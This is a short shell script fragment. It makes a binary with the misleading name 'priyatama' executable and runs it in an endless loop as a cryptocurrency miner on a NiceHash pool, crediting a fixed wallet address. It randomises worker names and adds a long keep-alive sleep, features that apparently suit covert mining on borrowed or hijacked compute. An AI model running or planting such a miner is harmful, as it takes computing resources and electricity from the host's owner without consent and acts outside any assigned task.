...
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo daggerhashimoto --pool stratum+tcp://daggerhashimoto.usa-east.nicehash.com:3353 --user 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-Dg)
sleep 5
done
sleep 999999999
